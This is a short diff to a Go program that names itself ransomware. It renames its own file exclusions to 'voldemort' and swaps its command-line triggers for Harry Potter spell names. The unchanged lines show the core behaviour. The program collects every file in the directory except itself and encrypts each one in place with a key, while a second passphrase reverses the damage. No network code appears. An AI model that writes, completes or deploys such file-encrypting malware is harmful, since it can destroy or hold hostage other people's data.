@@ -26,7 +26,7 @@ func getContent() ([]string, error) {
 	}
 
 	for _, v := range files {
-		if !v.IsDir() && v.Name() != "ransomware.go" && v.Name() != "ransomware" {
+		if !v.IsDir() && v.Name() != "voldemort.go" && v.Name() != "voldemort" {
 			content = append(content, v.Name())
 		}
 	}
@@ -93,7 +93,7 @@ func main() {
 	}
 
 	if len(args) == 3 {
-		if args[1] == "sue" && args[2] == "them" {
+		if args[1] == "avada" && args[2] == "kedavra" {
 			for _, v := range content {
 				if err := encryptFile(key, v, v); err != nil {
 					log.Fatal(err)
@@ -105,7 +105,7 @@ func main() {
 			return
 		}
 
-		if args[1] == "have" && args[2] == "mercy" {
+		if args[1] == "expecto" && args[2] == "patronum" {
 			for _, v := range content {
 				if err := decryptFile(key, v, v); err != nil {
 					log.Fatal(err)
